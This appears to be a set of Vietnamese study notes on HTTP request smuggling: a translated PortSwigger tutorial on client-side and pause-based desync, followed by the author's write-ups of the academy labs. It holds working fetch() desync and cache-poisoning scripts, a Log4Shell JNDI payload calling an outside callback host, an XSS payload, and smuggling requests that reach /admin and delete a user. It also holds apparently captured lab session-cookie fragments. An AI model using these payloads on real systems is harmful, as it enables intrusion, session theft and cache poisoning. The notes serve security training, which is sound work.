
- `mode: 'no-cors'` - Điều này đảm bảo rằng Connection ID của mỗi yêu cầu hiển thị trên tab Network, giúp gỡ lỗi.
- `credentials: 'include'` - Trình duyệt thường sử dụng các pool kết nối riêng cho các yêu cầu có cookie và không có cookie. Tùy chọn này đảm bảo bạn đang đầu độc pool kết nối “có cookie”, vốn là pool bạn sẽ cần cho hầu hết các khai thác.

Khi bạn chạy lệnh này, bạn sẽ thấy hai yêu cầu trên tab Network. Yêu cầu đầu tiên sẽ nhận phản hồi như thường. Nếu yêu cầu thứ hai nhận được phản hồi của tiền tố độc hại (trong trường hợp này là 404), điều này xác nhận rằng bạn đã kích hoạt thành công một desync từ trình duyệt của mình.

---

**Xử lý chuyển hướng**

---

Như đã đề cập, các yêu cầu tới những endpoint gây chuyển hướng ở cấp độ máy chủ là vector phổ biến cho desync phía khách. Khi xây dựng exploit, điều này tạo ra một trở ngại nhỏ vì trình duyệt sẽ theo redirect, làm phá vỡ chuỗi tấn công. May mắn là có một cách giải quyết đơn giản.

Bằng cách đặt `mode: 'cors'` cho yêu cầu ban đầu, bạn có thể cố ý gây ra lỗi CORS, điều này ngăn trình duyệt theo redirect. Bạn sau đó có thể tiếp tục chuỗi tấn công bằng cách gọi `catch()` thay vì `then()`. Ví dụ:

```jsx
fetch('<https://vulnerable-website.com/redirect-me>', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\\r\\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    location = '<https://vulnerable-website.com/>'
})
```

Nhược điểm của cách tiếp cận này là bạn sẽ không thể thấy Connection ID trên tab Network, điều này có thể làm việc gỡ lỗi khó khăn hơn.

---

### Xâm nhập

---

Khi bạn đã tìm được một vector thích hợp và xác nhận rằng bạn có thể gây ra desync thành công trong trình duyệt, bạn đã sẵn sàng bắt đầu tìm kiếm các gadget có thể khai thác.

---

Biến thể phía client của các cuộc tấn công cổ điển

---

Bạn có thể sử dụng những kỹ thuật này để thực hiện nhiều cuộc tấn công tương tự như khi khai thác **request smuggling** phía máy chủ. Điều bạn cần chỉ là nạn nhân truy cập một trang web độc hại khiến trình duyệt của họ khởi động cuộc tấn công.

[Lab: Client-side desync | Web Security Academy](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

---

Đầu độc bộ nhớ đệm phía client

---

Trước đó chúng ta đã bàn về cách sử dụng desync phía máy chủ để biến một on-site redirect thành open redirect, cho phép bạn chiếm đoạt việc import một tài nguyên JavaScript. Bạn có thể đạt được hiệu ứng tương tự chỉ bằng desync phía client, nhưng việc đầu độc đúng kết nối vào đúng thời điểm có thể phức tạp. Dễ dàng hơn nhiều khi dùng desync để đầu độc cache của trình duyệt. Bằng cách này, bạn không cần lo lắng kết nối nào được dùng để tải tài nguyên.

Trong phần này, chúng tôi sẽ hướng dẫn bạn quy trình xây dựng cuộc tấn công này. Nó bao gồm các bước cấp cao sau:

1. Xác định một vector CSD phù hợp và gây desync kết nối trình duyệt.
2. Sử dụng kết nối đã desync để đầu độc cache bằng một redirect.
3. Kích hoạt việc import tài nguyên từ tên miền mục tiêu.
4. Giao payload.

> Lưu ý
> 
> Khi thử nghiệm cuộc tấn công này trong trình duyệt, hãy chắc chắn xóa cache giữa mỗi lần thử (Settings > Clear browsing data > Cached images and files).

> Đầu độc bộ nhớ đệm bằng chuyển hướng

Khi bạn đã tìm được một vector CSD và xác nhận rằng bạn có thể tái tạo nó trong trình duyệt, bạn cần xác định một gadget chuyển hướng phù hợp. Sau đó, việc đầu độc bộ nhớ đệm khá đơn giản.

Đầu tiên, điều chỉnh proof-of-concept sao cho phần tiền tố bị smuggled sẽ kích hoạt một chuyển hướng tới tên miền nơi bạn sẽ lưu payload độc hại. Tiếp theo, thay đổi yêu cầu tiếp theo thành một yêu cầu trực tiếp cho file JavaScript mục tiêu.

Mã kết quả nên trông giống như sau:

```html
<script>
    fetch('<https://vulnerable-website.com/desync-vector>', {
        method: 'POST',
        body: 'GET /redirect-me HTTP/1.1\\r\\nFoo: x',
        credentials: 'include',
        mode: 'no-cors'
    }).then(() => {
        location = '<https://vulnerable-website.com/resources/target.js>'
    })
</script>
```

Điều này sẽ đầu độc bộ nhớ đệm, mặc dù sẽ tạo một vòng lặp chuyển hướng vô hạn quay lại script của bạn. Bạn có thể xác nhận điều này bằng cách xem script trong trình duyệt và nghiên cứu tab Network trong developer tools.

> Lưu ý
> 
> Bạn cần kích hoạt yêu cầu tiếp theo thông qua điều hướng ở cấp trên cùng (top-level navigation) tới tên miền mục tiêu. Do cách trình duyệt phân vùng bộ nhớ đệm, việc phát một yêu cầu cross-domain bằng `fetch()` sẽ đầu độc bộ nhớ đệm sai chỗ.

> Kích hoạt việc import tài nguyên

Gửi nạn nhân vào một vòng lặp vô hạn có thể hơi phiền, nhưng chưa phải là một exploit thực sự. Bây giờ bạn cần phát triển thêm script sao cho khi trình duyệt quay lại sau khi đã đầu độc cache, nó được điều hướng tới một trang trên site dễ bị tấn công mà sẽ kích hoạt việc import tài nguyên. Điều này dễ dàng thực hiện bằng cách sử dụng các câu lệnh điều kiện để chạy mã khác nhau tùy vào việc cửa sổ trình duyệt đã xem script của bạn hay chưa.

Khi trình duyệt cố import tài nguyên trên site mục tiêu, nó sẽ dùng mục cache đã bị đầu độc và bị chuyển hướng trở lại trang độc hại của bạn lần thứ ba.

> Giao payload

Ở giai đoạn này, bạn đã đặt nền tảng cho một cuộc tấn công, nhưng thách thức cuối cùng là tìm cách giao một payload có khả năng gây hại.

Ban đầu, trình duyệt nạn nhân tải trang độc hại của bạn dưới dạng HTML và thực thi JavaScript lồng bên trong trong ngữ cảnh của chính tên miền của bạn. Khi nó cuối cùng cố import file JavaScript trên tên miền mục tiêu và bị chuyển hướng tới trang độc hại của bạn, bạn sẽ nhận thấy script không thực thi. Điều này là vì bạn vẫn đang trả về HTML trong khi trình duyệt đang mong đợi JavaScript.

Để thành exploit thực sự, bạn cần một cách để phục vụ JavaScript thuần túy từ cùng một endpoint, đồng thời đảm bảo rằng điều này chỉ thực thi ở giai đoạn cuối để tránh can thiệp vào các yêu cầu thiết lập.

Một cách tiếp cận khả dĩ là tạo payload polyglot bằng cách bao HTML trong chú thích JavaScript:

```jsx
alert(1);
/*
<script>
    fetch( ... )
</script>
*/
```

Khi trình duyệt tải trang dưới dạng HTML, nó sẽ chỉ thực thi JavaScript trong thẻ `<script>`. Khi nó cuối cùng tải nội dung này trong ngữ cảnh JavaScript, nó sẽ chỉ thực thi payload `alert()`, coi phần còn lại của nội dung như những chú thích cho nhà phát triển.

Để biết thêm thông tin về cách chúng tôi tìm thấy lỗ hổng này ngoài đời thực, tham khảo Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling của PortSwigger Research.

---

Tấn công pivot nhắm vào hạ tầng nội bộ

---

Hầu hết các cuộc tấn công desync phía máy chủ liên quan đến việc thao túng các header HTTP theo cách chỉ có thể thực hiện bằng công cụ như Burp Repeater. Ví dụ, không thể bắt trình duyệt của ai đó gửi một request với payload log4shell trong header `User-Agent`:

```
GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

Điều này có nghĩa là những cuộc tấn công này thường bị giới hạn ở các website mà bạn có thể truy cập trực tiếp. Tuy nhiên, nếu website dễ bị desync phía client, bạn có thể đạt được hiệu ứng mong muốn bằng cách kích thích trình duyệt nạn nhân gửi request sau:

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
User-Agent: Mozilla/5.0 etc.
Content-Length: 86

GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: ${jndi:ldap://x.oastify.com}
```

Vì tất cả các request đều phát sinh từ trình duyệt nạn nhân, điều này có khả năng cho phép bạn pivot tấn công nhắm vào bất kỳ site nào mà họ có quyền truy cập. Điều này bao gồm các site nằm trên intranet tin cậy hoặc bị che khuất phía sau các hạn chế dựa trên IP. Một số trình duyệt đang phát triển các biện pháp giảm thiểu cho những kiểu tấn công này, nhưng các biện pháp đó có khả năng chỉ bao phủ một phần.

---

### Pause-based desync

---

Các website trông có vẻ an toàn có thể chứa các lỗ hổng desync ẩn mà chỉ lộ ra khi bạn tạm dừng ở giữa một yêu cầu.

Máy chủ thường được cấu hình với thời gian chờ đọc (read timeout). Nếu trong một khoảng thời gian nhất định chúng không nhận thêm dữ liệu, chúng sẽ coi yêu cầu là hoàn tất và trả về phản hồi, bất kể số byte mà chúng được thông báo sẽ nhận. Lỗ hổng desync dựa trên tạm dừng có thể xảy ra khi máy chủ hết thời gian chờ cho một yêu cầu nhưng để kết nối mở để tái sử dụng. Trong những điều kiện phù hợp, hành vi này có thể cung cấp một vectơ thay thế cho cả tấn công desync phía máy chủ và phía khách hàng.

> PortSwigger Research
> 
> Tài liệu và các phòng lab trong phần này dựa trên _Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling_ của PortSwigger Research.

---

Tấn công desync phía máy chủ dựa trên tạm dừng

---

Bạn có thể sử dụng kỹ thuật dựa trên tạm dừng để kích thích hành vi giống **CL.0**, cho phép bạn xây dựng khai thác request smuggling phía máy chủ cho các website ban đầu có vẻ an toàn.

Điều này phụ thuộc vào các điều kiện sau:

- Máy chủ front-end phải ngay lập tức chuyển tiếp từng byte của yêu cầu tới máy chủ back-end thay vì chờ đến khi nhận xong toàn bộ yêu cầu.
- Máy chủ front-end không được (hoặc có thể bị khuyến khích để không) hết thời gian chờ trước máy chủ back-end.
- Máy chủ back-end phải để kết nối mở để tái sử dụng sau khi xảy ra read timeout.

Để minh họa cách kỹ thuật này hoạt động, hãy đi qua một ví dụ. Sau đây là một probe request smuggling CL.0 tiêu chuẩn:

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

Hãy xét điều gì xảy ra nếu chúng ta gửi phần header tới một website dễ bị tổn thương, nhưng tạm dừng trước khi gửi phần body.

- Front-end chuyển tiếp phần header tới back-end, rồi tiếp tục chờ các byte còn lại theo như header Content-Length đã hứa.
- Sau một thời gian, back-end hết thời gian chờ và gửi một phản hồi, mặc dù nó chỉ mới tiêu thụ một phần của yêu cầu. Tại thời điểm này, front-end có thể đọc phản hồi đó và chuyển tiếp cho chúng ta, hoặc không.
- Chúng ta cuối cùng gửi phần body, trong trường hợp này chứa một tiền tố request smuggling cơ bản.
- Máy chủ front-end coi đây là phần tiếp tục của yêu cầu ban đầu và chuyển tiếp nó tới back-end trên cùng một kết nối.
- Máy chủ back-end đã trả lời cho yêu cầu ban đầu, vì vậy sẽ giả định rằng các byte này là bắt đầu của một yêu cầu khác.

Lúc này, chúng ta đã đạt được một desync giống CL.0, làm đầu độc kết nối front-end/back-end với một tiền tố yêu cầu.

Chúng tôi nhận thấy các máy chủ có nhiều khả năng bị tổn thương hơn khi chúng tự tạo phản hồi thay vì chuyển tiếp yêu cầu cho ứng dụng.

> PortSwigger Research
> 
> Nhóm nghiên cứu của chúng tôi phát hiện lỗ hổng này trên Apache HTTP Server phổ biến, server này thể hiện hành vi như trên khi thực hiện chuyển hướng ở cấp máy chủ từ `/example` sang `/example/`. Chúng tôi đã báo cáo vấn đề này và nó đã được khắc phục trong phiên bản **2.4.53** — hãy cập nhật nếu bạn chưa làm. Để biết thêm chi tiết, xem _Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling_ của PortSwigger Research.

---

Kiểm tra lỗ hổng CL.0 dựa trên tạm dừng

---

Có thể kiểm tra lỗ hổng CL.0 dựa trên tạm dừng bằng Burp Repeater, nhưng chỉ khi máy chủ front-end chuyển tiếp phản hồi của back-end phát sinh sau thời gian chờ ngay lập tức cho bạn - điều này không phải lúc nào cũng xảy ra. Chúng tôi khuyến nghị sử dụng extension **Turbo Intruder** vì nó cho phép bạn tạm dừng giữa chừng một yêu cầu rồi tiếp tục bất kể bạn đã nhận được phản hồi hay chưa.

Trong Burp Repeater, tạo một probe request smuggling CL.0 giống như ví dụ bên trên, rồi gửi nó tới Turbo Intruder.

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

Trong bảng trình soạn thảo Python của Turbo Intruder, điều chỉnh cấu hình engine request để đặt các tùy chọn sau:

```
concurrentConnections=1
requestsPerConnection=100
pipeline=False
```

Đưa request vào hàng đợi, thêm các tham số sau vào giao diện `queue()`:

- `pauseMarker` — Một danh sách các chuỗi mà sau đó bạn muốn Turbo Intruder tạm dừng.
- `pauseTime` — Thời lượng tạm dừng tính bằng mili-giây.

Ví dụ, để tạm dừng sau phần header trong 60 giây, đưa request vào hàng đợi như sau:

```
engine.queue(target.req, pauseMarker=['\\r\\n\\r\\n'], pauseTime=60000)
```

Bố trí một request theo sau tùy ý như bình thường:

```
followUp = 'GET / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\n\\r\\n'
engine.queue(followUp)
```

Đảm bảo rằng bạn ghi lại tất cả các phản hồi vào bảng kết quả:

```
def handleResponse(req, interesting):
    table.add(req)
```

Khi bạn mới bắt đầu cuộc tấn công, bạn sẽ không thấy kết quả nào trong bảng. Tuy nhiên, sau khi hết thời lượng tạm dừng đã chỉ định, bạn sẽ thấy hai kết quả. Nếu phản hồi của request thứ hai khớp với điều bạn mong đợi từ tiền tố bị smuggle (trong trường hợp này là mã 404), điều này gợi ý mạnh rằng desync đã thành công.

[Lab: Server-side pause-based request smuggling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling)

> Lưu ý
> 
> Thay vì dùng `pauseMarker` để chỉ định tạm dừng dựa trên so khớp chuỗi, bạn có thể dùng đối số `pauseBefore` để chỉ định một offset. Ví dụ, bạn có thể tạm dừng trước phần body bằng cách chỉ định một offset là nghịch đảo của `Content-Length` (ví dụ `pauseBefore=-34`).

---

Desync phía khách hàng dựa trên tạm dừng

---

Về lý thuyết, có thể thực hiện một biến thể desync CL.0 phía khách hàng dựa trên tạm dừng. Tuy nhiên, chúng tôi vẫn chưa tìm được cách đáng tin cậy để bắt trình duyệt tạm dừng giữa chừng một yêu cầu. Có một cách giải quyết khả dĩ - một cuộc tấn công MITM chủ động.

Việc mã hóa do TLS cung cấp có thể ngăn kẻ MITM đọc lưu lượng khi đang truyền, nhưng không có gì ngăn họ trì hoãn các gói TCP trên đường từ trình duyệt tới máy chủ web. Bằng cách đơn giản trì hoãn gói cuối cùng cho tới khi máy chủ web phát sinh phản hồi, bạn có thể gây desync kết nối của trình duyệt.

Luồng tấn công này tương tự như bất kỳ tấn công desync phía khách hàng nào khác. Người dùng truy cập một trang web độc hại, trang này khiến trình duyệt của họ phát sinh một loạt yêu cầu cross-domain tới trang đích. Trong trường hợp này, bạn cần chủ ý bù đệm (pad) cho yêu cầu đầu tiên sao cho hệ điều hành tách nó thành nhiều gói TCP. Vì bạn kiểm soát phần padding, bạn có thể bù đệm tới mức gói cuối cùng có kích thước khác biệt để từ đó biết chính xác gói nào cần bị trì hoãn.

Để xem ví dụ thực tế về cách điều này có thể trông ra sao, xem _Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling_.

---

# Bảo mật

---

Lỗ hổng HTTP request smuggling phát sinh khi máy chủ front-end và máy chủ back-end sử dụng các cơ chế khác nhau để xác định ranh giới giữa các yêu cầu. Điều này có thể do sự khác biệt về việc các server HTTP/1 sử dụng header **`Content-Length`** hay **`chunked transfer encoding`** để xác định nơi mỗi yêu cầu kết thúc. Trong môi trường **HTTP/2**, việc hạ cấp (downgrade) các yêu cầu HTTP/2 cho back-end cũng thường chứa nhiều vấn đề và có thể cho phép hoặc làm đơn giản hóa một số tấn công bổ sung.

Để phòng tránh lỗ hổng HTTP request smuggling, chúng tôi khuyến nghị các biện pháp tổng quát sau:

- Sử dụng **HTTP/2 end-to-end** và vô hiệu hóa việc hạ cấp HTTP nếu có thể. HTTP/2 sử dụng cơ chế vững chắc để xác định độ dài của yêu cầu và, khi dùng end-to-end, về bản chất được bảo vệ chống lại request smuggling. Nếu không thể tránh việc hạ cấp HTTP, hãy đảm bảo bạn xác thực lại yêu cầu đã được chuyển đổi theo đặc tả **HTTP/1.1**. Ví dụ: bác bỏ các yêu cầu chứa newline trong header, dấu hai chấm trong tên header, hoặc khoảng trắng trong phương thức yêu cầu.
- Để máy chủ front-end chuẩn hoá các yêu cầu mơ hồ và khiến máy chủ back-end từ chối bất kỳ yêu cầu nào vẫn còn mơ hồ, đồng thời đóng kết nối TCP trong quá trình đó.
- Không bao giờ giả định rằng yêu cầu không có body. Đây là nguyên nhân cơ bản dẫn đến cả CL.0 và các lỗ hổng desync phía khách hàng.
- Mặc định huỷ kết nối nếu có ngoại lệ ở cấp server khi xử lý yêu cầu.
- Nếu bạn định tuyến lưu lượng qua proxy chuyển tiếp (forward proxy), đảm bảo bật HTTP/2 upstream nếu có thể.
- Như chúng tôi đã trình bày trong tài liệu học tập, vô hiệu hóa tái sử dụng kết nối phía back-end sẽ giúp giảm thiểu một số loại tấn công, nhưng điều này vẫn không bảo vệ bạn khỏi các tấn công request tunnelling.


# WU
- [ ] HTTP request smuggling - Basic CL.TE vulnerability
- [ ] HTTP request smuggling - Basic TE.CL vulnerability
- [ ] HTTP request smuggling - Obfuscating the TE header
- [ ] HTTP request smuggling - Finding CL.TE vulnerability using timing techniques
- [ ] HTTP request smuggling - Finding TE.CL vulnerability using timing techniques
- [ ] HTTP request smuggling - Confirming CL.TE via differential responses
- [ ] HTTP request smuggling - Confirming TE.CL via differential responses
- [ ] Exploiting HTTP request smuggling to bypass front-end security controls (CL.TE)
- [ ] Exploiting HTTP request smuggling to bypass front-end security controls (TE.CL)
- [ ] Exploiting HTTP request smuggling to reveal front-end request rewriting
- [ ] Exploiting HTTP request smuggling to capture other users' requests

- [ ] Exploiting HTTP request smuggling to deliver reflected XSS
- [ ] Response queue poisoning via H2.TE request smuggling
- [ ] H2.CL request smuggling
- [ ] HTTP/2 request smuggling via CRLF injection
- [ ] HTTP/2 request splitting via CRLF injection
- [ ] CL.0 request smuggling
- [ ] Exploiting HTTP request smuggling to perform web cache poisoning
- [ ] Exploiting HTTP request smuggling to perform web cache deception
- [ ] Bypassing access controls via HTTP/2 request tunnelling
- [ ] Web cache poisoning via HTTP/2 request tunnelling
- [ ] Client-side desync
- [ ] Browser-powered desync attacks
- [ ] WebSocket MITM via cross-site WebSocket hijacking
- [ ] Manipulating WebSocket messages to exploit vulnerabilities
- [ ] Manipulating the WebSocket handshake to exploit vulnerabilities

## HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
- mục tiêu là xác nhận website bị http request smuggling kiểu CL.TE bằng cách gửi reqeust làm bạk-end bị lệch rồi xem response khac sthuongwf ở reqeust tiếp
```
Front-end dùng Content-Length
Back-end dùng Transfer-Encoding: chunked
```
nên back-end sẽ xử  lý phần sau 0 như 1 request mới bị smuggle

![](../../image/Pasted%20image%2020260517154648.png)

- gửi 1 request chứa đồng thời content-length và transfer-encdoing chunked 2 lần

Với lỗi CL.TE, front-end sử dụng Content-Length để xác định độ dài request, còn back-end sử dụng Transfer-Encoding. Do đó back-end coi chunk `0` là kết thúc body và xử lý phần sau `GET /404 HTTP/1.1` như một request mới bị smuggle. Response khác biệt, cụ thể là request dẫn đến `/404`, xác nhận front-end và back-end bị desync.

Request có cả:
```
Content-Length: 35Transfer-Encoding: chunked
```
Trong lỗi **CL.TE**:
```
Front-end đọc theo Content-LengthBack-end đọc theo Transfer-Encoding: chunked
```
Back-end thấy:
```
0
```

nên hiểu body chunked đã kết thúc.
Phần sau:
```
GET /404 HTTP/1.1X-Ignore: X
```
bị back-end coi như **request tiếp theo** đã bị nhét lén vào connection.
`X-Ignore: X` dùng để “nuốt” phần thừa/ghép request sau, giúp request smuggled hợp lệ hơn.

## HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

- mục tiêu là xác nhận wbe bị dính lỗi TE.CL 

gửi request:
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

![](../../image/Pasted%20image%2020260517155802.png)

- sau khi gửi request 2 lần thì back-end bị lệch nên xử lí request bị smuggle tới /404
- đặt `Content-Length: 4` để back-end chỉ đọc 4 byte đầu của body, trong khi phần còn lại chứa request `POST /404` bị giữ lại trong connection. Khi gửi request lần thứ hai, back-end xử lý phần request smuggled này và trả về `404 Not Found`. Response khác biệt này xác nhận front-end và back-end bị desync theo kiểu TE.CL.

## Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
- mục tiêu là bypass front-end chặn /admin bằng cách smuggle reqeust /admin trực tiếp tới back-ed
![](../../image/Pasted%20image%2020260517160326.png)

- khi gửi request trên 2 lần thì back-end thấy 0 nên hiểu body chunked đã kêt sthuaast, phần GET ... bị back-end coi là request tiếp theo nên đã xử lí => CL.TE
nhưng báo lỗi 401, có thể cần host: localhost

![](../../image/Pasted%20image%2020260517160506.png)

=> vẫn bị block vì khi request tiếp theo được ghép vào, nó cũng có header `Host` thật của lab. Thành ra back-end thấy **2 Host header conflic**


![](../../image/Pasted%20image%2020260517160641.png)

- thêm vào reqeust:
```
Content-Length: 10

x=
```

Mục đích là để khi request tiếp theo được nối vào, các header thật của request tiếp theo sẽ bị back-end coi là **body** của request smuggled, không còn gây conflict `Host`.

![](../../image/Pasted%20image%2020260517160817.png)


## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
- mục tiêu vẫn là truy cập /admin nhưng lỗi là TE.CL

![](../../image/Pasted%20image%2020260517161439.png)

- request ./admin đc smuggle nhưng bị từ chối vì 401
- khi thêm localhost vì ta đã vào đc admin panel
![](../../image/Pasted%20image%2020260517161511.png)


![](../../image/Pasted%20image%2020260517161551.png)


## Exploiting HTTP request smuggling to reveal front-end request rewriting
- mục tiêu là dùng request smuggling để xem front-end đã tự thêm/ sửa header gì trước khi request vào back-end
![](../../image/Pasted%20image%2020260517162341.png)

Request smuggled là:
```
POST / HTTP/1.1Content-Length: 200search=test
```
Vì `Content-Length: 200` lớn hơn body thật, request tiếp theo bị back-end nối vào body của `search`.
Do chức năng search reflect giá trị `search`, response làm lộ phần request đã được front-end thêm header.

![](../../image/Pasted%20image%2020260517162930.png)

smuggle request tới /admin và tự thêm header này với giá trị 127.0.0.1 để bypass kiểm soát truy cập. Cuối cùng đổi URL smuggled thành /admin/delete?username=carlos để xóa user Carlos.

## Exploiting HTTP request smuggling to capture other users' requests

- mục tiêu là smuggle request comment có `Content-Length` lớn để **request của victim bị nối vào cuối comment**, rồi lấy cookie của victim từ comment đó.


## Exploiting HTTP request smuggling to deliver reflected XSS
- mục tiêu: web có reflect XSS ở header user-agent trong trang blog
- vào 1 blog post bất kì, ở trag repeater, sửa header
`User-Agent: "/><script>alert(1)</script>`
sẽ thấy payload được reflect trong response, vì form comment có hidden input chứa `User-Agent`.
![](../../image/Pasted%20image%2020260517170457.png)
![](../../image/Pasted%20image%2020260517170914.png)

- Request tiếp theo của victim sẽ bị ghép vào sau request smuggled này. Victim nhận response của blog post có payload `User-Agent` bị reflect, nên `alert(1)` chạy trong trình duyệt victim.
## Response queue poisoning via H2.TE request smuggling
- mục tiêu là đánh cắp response login của admin rồi xóa carlos
- đầu tiên là confirm H2.TE
![](../../image/Pasted%20image%2020260517171010.png)
Gửi vài lần. Nếu mỗi request thứ hai trả `404`, nghĩa là back-end đang nối request sau vào prefix `SMUGGLED`, xác nhận H2.TE.

- tạo request smuggle hoàn chỉnh tới endpoint
![](../../image/Pasted%20image%2020260517171131.png)
sau  dòng host của request smuggle phải có 2 dòng trống

![](../../image/Pasted%20image%2020260517171250.png)

- gửi request nhiều lần, phần lớn sẽ là 404, nhưng sẽ có 1 cái bắt trúng response của admin

.....

## HTTP request smuggling, basic CL.TE vulnerability

- bài này có lỗi  CL.TE**, front-end **không hỗ trợ chunked**, còn back-end xử lý `Transfer-Encoding: chunked`
![](../../image/Pasted%20image%2020260517172049.png)Lần gửi đầu tiên dùng để làm lệch connection.
Lần gửi thứ hai, request sẽ bị back-end hiểu thành:
```
GPOST / HTTP/1.1
```
Do đó response thường sẽ báo lỗi kiểu:
```
Unrecognized method GPOST
```

Hoặc response lỗi tương tự

## HTTP request smuggling, basic TE.CL vulnerability
- mục tiêu lab có lỗi TE.CL, front-end đọc transfer-encoding chunked còn back-end đọc content-length
![](../../image/Pasted%20image%2020260517172558.png)

Trong lỗi **TE.CL**:
```
Front-end đọc theo Transfer-Encoding: chunkedBack-end đọc theo Content-Length
```
Back-end thấy:
```
Content-length: 4
```
nên nó chỉ đọc 4 byte đầu body:
```
5c\r\n
```
Phần còn lại bắt đầu bằng:
```
GPOST / HTTP/1.1
```
bị để lại trong connection.
Khi gửi request lần hai, back-end xử lý phần còn dư này và thấy method:
```
GPOST
```
nên báo lỗi method không hợp lệ.


## HTTP request smuggling, obfuscating the TE header
- mục tiêu là cả front-end và back-end đều có thể xử lý `Transfer-Encoding`, nhưng ta **obfuscate một header TE** để một bên bỏ qua, tạo desync
Điểm mấu chốt là có **2 header Transfer-Encoding**:
```
Transfer-Encoding: chunkedTransfer-encoding: cow
```
Front-end và back-end xử lý header trùng/biến thể khác nhau. Một bên vẫn hiểu request là `chunked`, bên còn lại bị đánh lừa và xử lý theo `Content-length: 4`.
Vì back-end chỉ đọc 4 byte đầu body:
```
5c\r\n
```
phần còn lại bắt đầu bằng:
```
GPOST / HTTP/1.1
```
bị giữ lại trong connection. Khi gửi request lần hai, back-end xử lý phần còn dư này như request mới và báo lỗi method `GPOST`
![](../../image/Pasted%20image%2020260517172922.png)

## CL.0 request smuggling
- mục tiêu có back-end **bỏ qua `Content-Length` trên một số endpoint**, nên phần body ta gửi sau request chính có thể bị giữ lại và xử lý như request tiếp theo

![](../../image/Pasted%20image%2020260517181436.png)

- tạo 2 request ở repeater rồi gộp nhóm và gửi group in sequence (single connection)
```
POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
```

```
GET /hopefully404 HTTP/1.1
Foo: x
```

- đổi body ở request 1 thành GEt /admin
![](../../image/Pasted%20image%2020260517181602.png)

=> đổi lại request và gửi
```
GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

Tóm lại: Khi body chứa GET /hopefully404, response của request thứ hai trả 404, chứng minh body của request đầu bị bỏ lại và được xử lý như prefix của request sau. Sau đó tôi đổi request smuggled thành GET /admin để truy cập admin panel, rồi đổi thành GET /admin/delete?username=carlos để xóa user Carlos.


## H2.CL request smuggling

- front-end nhận **HTTP/2**, downgrade xuống HTTP/1.1 nhưng vẫn tin `Content-Length` mơ hồ, làm back-end bị desync.
![](../../image/Pasted%20image%2020260517173655.png)
=> confirm H2.CL
Nếu vulnerable, mỗi request thứ hai có thể trả `404`, vì request sau bị back-end ghép với prefix `SMUGGLED`. Đây là dấu hiệu desync H2.CL

![](../../image/Pasted%20image%2020260517173758.png)
- khi gửi request hấy redirect tới resources, lợi dụng điều này để chuyển victim sang exploit server

![](../../image/Pasted%20image%2020260517173929.png)

Victim truy cập home page mỗi khoảng 10 giây. Bạn cần gửi payload ở bước 5 vài lần, chờ khoảng 10 giây, rồi kiểm tra: access log

thấy request:
```
GET /resources/
```
từ victim, nghĩa là redirect thành công.
![](../../image/Pasted%20image%2020260517174013.png)

## HTTP/2 request smuggling via CRLF injection
- front-end downgrade HTTP/2 xuống HTTP/1.1 nhưng không sanitize newline trong header. Mục tiêu là **lấy session cookie của victim** qua search history.
![](../../image/Pasted%20image%2020260517174442.png)
- ta thấy site lưu các tìm kiếm theo session
- gửi request post sang repeater, thêm header mới
![](../../image/Pasted%20image%2020260517174605.png)

![](../../image/Pasted%20image%2020260517175009.png)

- gửi vài lần thấy request thứ 2 trả 404 => back-end đang append trequest sau vào prefix smuglles, xác nhận desync

sửa lại body rồi gửi request mới:
![](../../image/Pasted%20image%2020260517175155.png)
![](../../image/Pasted%20image%2020260517175135.png)

Gửi request, rồi **refresh trang lab trong browser**.
Nếu thấy search results reflect request của chính mình, . Gửi lại payload, chờ khoảng **15 giây**, rồi refresh lại.
![](../../image/Pasted%20image%2020260517175916.png)


WiofyfJ7EjFIXR9ecbr2pQUewBHtH4L8 secret%3d
XHqANnPqrKrZF3CagKlHRLxMs6BoHa1r
%3b+session%
3dynBNF6`


## HTTP/2 request splitting via CRLF injection
- mục tiêu là front-end nhận HTTP/2 rồi downgrade sang HTTP/1.1, nhưng không lọc CRLF trong **header value**, nên ta chèn thêm một request HTTP/1.1 vào header sau khi downgrade. Mục tiêu là làm victim nhận response chứa JS từ exploit server và chạy `alert(document.cookie)`

- ở repeater, thêm header
![](../../image/Pasted%20image%2020260517182343.png)
- khi gửi request thấy response có status 404 =. spliting hoạt động
![](../../image/Pasted%20image%2020260517182335.png)
